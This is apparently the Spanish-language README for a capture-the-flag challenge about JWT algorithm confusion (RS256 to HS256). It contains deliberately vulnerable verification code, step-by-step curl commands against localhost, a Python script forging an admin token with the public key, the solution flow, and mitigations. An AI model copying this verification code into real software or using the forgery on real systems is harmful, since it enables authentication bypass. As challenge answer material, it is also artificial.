# SecureAuth — hardcore-api-jwt-confusion

| Campo       | Valor                               |
|-------------|-------------------------------------|
| ID          | api-hardcore-jwt-confusion          |
| Nombre      | SecureAuth                          |
| Categoria   | api                                 |
| Dificultad  | hardcore                            |
| Puerto      | 80 (host: 8082 por defecto)         |
| Timeout     | 3600 s                              |

---

## Descripcion

Un sistema de autenticacion empresarial firma sus tokens JWT usando RSA
(algoritmo RS256). La clave publica esta expuesta en `/api/jwks` para que
los clientes puedan verificar tokens. El servidor acepta tokens firmados
tanto con RS256 como con HS256, usando la clave publica PEM como secreto
HMAC en el segundo caso.

Un atacante que conoce la clave publica puede firmar un JWT con HS256
usando esa clave como secreto, incluyendo `role: admin` en el payload.
El servidor, al verificar, acepta el token como valido.

---

## Vulnerabilidad

**JWT Algorithm Confusion (RS256 -> HS256)**

En JWT hay dos familias de algoritmos:
- **Asimetrico (RS256)**: firma con clave privada, verifica con clave publica.
- **Simetrico (HS256)**: firma y verifica con la misma clave secreta.

La vulnerabilidad ocurre cuando el servidor:
1. Expone su clave publica RSA (necesario para verificacion normal).
2. Acepta tokens firmados con HS256.
3. Usa la clave publica PEM como secreto HMAC al verificar HS256.

El atacante puede entonces:
1. Obtener la clave publica (publica, de libre acceso).
2. Firmar un JWT malicioso con HS256 usando esa clave publica como secreto.
3. El servidor verifica el token — usa la misma clave publica como secreto HS256 — y acepta el token.

### Codigo vulnerable

```python
for algo, key in [('RS256', PUBLIC_KEY), ('HS256', PUBLIC_KEY_PEM)]:
    try:
        payload = jwt.decode(token, key, algorithms=[algo])
        return payload, None
    except jwt.InvalidTokenError:
        continue
```

---

## Pasos del ataque

### Paso 1 — Registrar una cuenta de usuario

```bash
curl -s -X POST http://localhost:8082/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "hunter2"}'
```

### Paso 2 — Login para obtener un JWT RS256 valido

```bash
curl -s -X POST http://localhost:8082/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "hunter2"}'

# Respuesta:
{"token": "<JWT_RS256>", "algorithm": "RS256"}
```

### Paso 3 — Obtener la clave publica RSA

```bash
curl -s http://localhost:8082/api/jwks

# Respuesta:
{
  "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjAN...",
  "algorithm": "RS256"
}
```

### Paso 4 — Verificar que el rol actual es "user"

```bash
# Decodificar el payload del JWT (sin verificar firma):
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

### Paso 5 — Forjar JWT con HS256 y role=admin

```python
import jwt
import time

# La clave publica obtenida de /api/jwks
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjAN...
-----END PUBLIC KEY-----"""

forged_payload = {
    "sub": "attacker",
    "role": "admin",    # <-- escalada de privilegios
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

# Firmamos con HS256 usando la clave PUBLICA RSA como secreto HMAC
forged_token = jwt.encode(forged_payload, PUBLIC_KEY_PEM, algorithm="HS256")
print(forged_token)
```

### Paso 6 — Acceder al endpoint privilegiado

```bash
curl -s http://localhost:8082/api/admin/flag \
  -H "Authorization: Bearer <FORGED_TOKEN>"

# Respuesta:
{
  "flag": "CTF{...FLAG...}",
  "message": "Congratulations! Algorithm confusion attack successful."
}
```

---

## Script de solucion automatizado

```bash
pip install pyjwt cryptography requests
python solve.py localhost 8082
```

---

## Como ejecutar el reto

```bash
FLAG="CTF{test_flag_123}" docker-compose up --build
# Acceder en http://localhost:8082
```

---

## Mitigacion (para referencia educativa)

- Nunca aceptar multiples familias de algoritmos sin restriction expliciita por usuario/token.
- Especificar el algoritmo esperado al momento de verificar, sin depender del header del token.
- Usar `jwt.decode(token, public_key, algorithms=["RS256"])` exclusivamente — nunca incluir HS256 si el sistema usa RS256.
- Considerar una lista de algoritmos permitidos fija, sin opcion de "fallback".
